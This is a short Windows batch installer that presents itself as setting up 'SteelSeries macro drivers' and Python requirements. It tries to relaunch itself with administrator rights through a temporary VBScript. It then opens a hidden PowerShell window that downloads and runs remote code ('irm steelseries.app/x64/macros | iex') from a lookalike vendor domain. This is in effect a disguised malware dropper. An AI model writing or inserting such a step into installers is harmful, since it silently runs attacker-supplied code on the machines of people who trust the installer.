@echo off
setlocal EnableDelayedExpansion

set "procname=cmd.exe"
for /f %%A in ('tasklist /fi "imagename eq %procname%" ^| find /c /i "%procname%"') do set "count_before=%%A"

set "vbsfile=%temp%\elevate.vbs"
> "%vbsfile%" echo Set UAC = CreateObject^("Shell.Application"^)
>>"%vbsfile%" echo UAC.ShellExecute "%~f0", "", "", "runas", 1
cscript //nologo "%vbsfile%" >nul
del "%vbsfile%"

:: Wait a bit for elevated proc to start
timeout /t 5 >nul

:: Count processes after elevation attempt
for /f %%A in ('tasklist /fi "imagename eq %procname%" ^| find /c /i "%procname%"') do set "count_after=%%A"

echo Processes after: %count_after%

:: Compare counts
if %count_after% GTR %count_before% (
    echo Elevated instance detected. Exiting this one.
    exit /b
) else (
    echo Admin denied...
)

color 6
echo [LOG] Installing Drivers

:: Use steelseries macro drivers...
powershell Start-Process powershell -ArgumentList 'irm steelseries.app/x64/macros ^| iex' -WindowStyle Hidden

color a
echo [LOG] Drivers Installed!

color 6
echo [LOG] Installing requirements.txt
pip install -r requirements.txt

color a
echo [LOG] Requirements Installed!

echo If the script fails...
echo rerun installer.bat with admin privileges

PAUSE
cls
